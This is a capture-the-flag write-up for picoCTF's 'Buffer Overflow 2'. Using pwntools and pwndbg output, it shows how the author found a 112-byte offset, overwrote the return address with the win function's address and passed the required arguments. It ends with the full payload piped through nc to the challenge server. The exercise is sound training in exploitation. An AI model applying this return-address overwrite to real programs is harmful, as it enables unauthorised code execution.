# PicoGym - Buffer Overflow 2

- Write-Up Author: looy3 


## Write up  

---

I started as I generally would with buffer overflow problems -- looked at sourcecode and generated a cyclic payload to use with gdb. I found the offset was 112. The B test confirmed this offset. I continued by running 
```
p win
```
to get the address of the win function for the payload. I got it as 0x8049296. By using pwntools, I did this:
```
>>> from pwn import *
>>> p32(0x8049296)
b'\x96\x92\x04\x08'
>>> 'A'*112
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
```
By entering those into gdb as the following:
```
r <<< $(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08
```
I ran it. But it didn't give me the flag. So I made a breakpoint at win
```
b win
```
And reran. I confirmed it stopped at the win function. By putting another cyclic at the end of the payload, I found the following:
```
pwndbg> r <<< $(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa")
Starting program: /home/tjesa/PicoCTF/Medium/Pwn/bufferoverflow2/vuln <<< $(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa")
[Thread debugging using libthread_db enabled]
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa

Breakpoint 1, 0x0804929e in win ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────
 EAX  0x9d
 EBX  0x41414141 ('AAAA')
 ECX  0xf7fad8a0 (_IO_stdfile_1_lock) ◂— 0
 EDX  0
 EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0
 ESI  0x80493f0 (__libc_csu_init) ◂— endbr32
 EBP  0xffffcd0c ◂— 'AAAAaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa'
 ESP  0xffffcd08 ◂— 'AAAAAAAAaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa'
 EIP  0x804929e (win+8) ◂— sub esp, 0x54
──────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────
 ► 0x804929e <win+8>     sub    esp, 0x54     ESP => 0xffffccb4 (0xffffcd08 - 0x54)
   0x80492a1 <win+11>    call   __x86.get_pc_thunk.bx       <__x86.get_pc_thunk.bx>

   0x80492a6 <win+16>    add    ebx, 0x2d5a
   0x80492ac <win+22>    sub    esp, 8
   0x80492af <win+25>    lea    eax, [ebx - 0x1ff8]
   0x80492b5 <win+31>    push   eax
   0x80492b6 <win+32>    lea    eax, [ebx - 0x1ff6]
   0x80492bc <win+38>    push   eax
   0x80492bd <win+39>    call   fopen@plt                   <fopen@plt>

   0x80492c2 <win+44>    add    esp, 0x10
   0x80492c5 <win+47>    mov    dword ptr [ebp - 0xc], eax
──────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────
00:0000│ esp 0xffffcd08 ◂— 'AAAAAAAAaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa'
01:0004│ ebp 0xffffcd0c ◂— 'AAAAaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa'
02:0008│+004 0xffffcd10 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa'
03:000c│+008 0xffffcd14 ◂— 'baaacaaadaaaeaaafaaagaaahaaaiaaajaaa'
04:0010│+00c 0xffffcd18 ◂— 'caaadaaaeaaafaaagaaahaaaiaaajaaa'
05:0014│+010 0xffffcd1c ◂— 'daaaeaaafaaagaaahaaaiaaajaaa'
06:0018│+014 0xffffcd20 ◂— 'eaaafaaagaaahaaaiaaajaaa'
07:001c│+018 0xffffcd24 ◂— 'faaagaaahaaaiaaajaaa'
────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────
 ► 0 0x804929e win+8
   1 0x61616161 None
   2 0x61616162 None
   3 0x61616163 None
   4 0x61616164 None
   5 0x61616165 None
──────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────
*EAX  0xffffccc0 ◂— 'asdfasdfasdfasdf\n'
 EBX  0x41414141 ('AAAA')
*ECX  0
*EDX  0x804e248 ◂— 0
 EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0
 ESI  0x80493f0 (__libc_csu_init) ◂— endbr32
*EBP  0x41414141 ('AAAA')
*ESP  0xffffcd14 ◂— 'baaacaaadaaaeaaafaaagaaahaaaiaaajaaa'
*EIP  0x61616161 ('aaaa')
──────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────
Invalid address 0x61616161










──────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────
00:0000│ esp 0xffffcd14 ◂— 'baaacaaadaaaeaaafaaagaaahaaaiaaajaaa'
01:0004│     0xffffcd18 ◂— 'caaadaaaeaaafaaagaaahaaaiaaajaaa'
02:0008│     0xffffcd1c ◂— 'daaaeaaafaaagaaahaaaiaaajaaa'
03:000c│     0xffffcd20 ◂— 'eaaafaaagaaahaaaiaaajaaa'
04:0010│     0xffffcd24 ◂— 'faaagaaahaaaiaaajaaa'
05:0014│     0xffffcd28 ◂— 'gaaahaaaiaaajaaa'
06:0018│     0xffffcd2c ◂— 'haaaiaaajaaa'
07:001c│     0xffffcd30 ◂— 'iaaajaaa'
────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────
 ► 0 0x61616161 None
   1 0x61616162 None
   2 0x61616163 None
   3 0x61616164 None
   4 0x61616165 None
   5 0x61616166 None
   6 0x61616167 None
   7 0x61616168 None
──────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l baaacaaadaaaeaaafaaagaaahaaaiaaajaaa
Lookup pattern must be 4 bytes (use `-n <length>` to lookup pattern of different length)
pwndbg> cyclic -l baaa
Finding cyclic pattern of 4 bytes: b'baaa' (hex: 0x62616161)
Found at offset 4
```
I looked for the offset of the ESP. Here I discovered that the ESP can indicate the arguments passed to the function. And it was receiving those arguments at 4 bytes. So I reconstructed the payload using the 4 byte offset and the arguments required to be passed based on the source.
```
pwndbg> r <<< $(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08AAAA\r\xf0\xfe\xca\r\xf0\r\xf0")
Starting program: /home/tjesa/PicoCTF/Medium/Pwn/bufferoverflow2/vuln <<< $(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\xUsing host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Please enter your string:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAA�AAAA

Breakpoint 1, 0x0804929e in win ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────
 EAX  0x81
 EBX  0x41414141 ('AAAA')
 ECX  0xf7fad8a0 (_IO_stdfile_1_lock) ◂— 0
 EDX  0
 EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0
 ESI  0x80493f0 (__libc_csu_init) ◂— endbr32
 EBP  0xffffcd0c ◂— 0x41414141 ('AAAA')
 ESP  0xffffcd08 ◂— 0x41414141 ('AAAA')
 EIP  0x804929e (win+8) ◂— sub esp, 0x54
──────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────
 ► 0x804929e <win+8>     sub    esp, 0x54     ESP => 0xffffccb4 (0xffffcd08 - 0x54)
   0x80492a1 <win+11>    call   __x86.get_pc_thunk.bx       <__x86.get_pc_thunk.bx>

   0x80492a6 <win+16>    add    ebx, 0x2d5a
   0x80492ac <win+22>    sub    esp, 8
   0x80492af <win+25>    lea    eax, [ebx - 0x1ff8]
   0x80492b5 <win+31>    push   eax
   0x80492b6 <win+32>    lea    eax, [ebx - 0x1ff6]
   0x80492bc <win+38>    push   eax
   0x80492bd <win+39>    call   fopen@plt                   <fopen@plt>

   0x80492c2 <win+44>    add    esp, 0x10
   0x80492c5 <win+47>    mov    dword ptr [ebp - 0xc], eax
──────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────
00:0000│ esp 0xffffcd08 ◂— 0x41414141 ('AAAA')
01:0004│ ebp 0xffffcd0c ◂— 0x41414141 ('AAAA')
02:0008│+004 0xffffcd10 ◂— 0x41414141 ('AAAA')
03:000c│+008 0xffffcd14 ◂— 0xcafef00d
04:0010│+00c 0xffffcd18 ◂— 0xf00df00d
05:0014│+010 0xffffcd1c ◂— 0x300
06:0018│+014 0xffffcd20 —▸ 0xffffcd40 ◂— 1
07:001c│+018 0xffffcd24 —▸ 0xf7fabe34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* ',\r#' */
────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────
 ► 0 0x804929e win+8
   1 0x41414141 None
   4    0x300 None
   5 0xffffcd40 None
──────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> c
Continuing.
asdfasdfasdfasdf
```
This asdfasdfasdfasf was the flag I had set. So I copied the same exact echo payload and piped it to netcat to get the flag:
```
echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08AAAA\r\xf0\xfe\xca\r\xf0\r\xf0" | nc saturn.picoctf.net 53635
```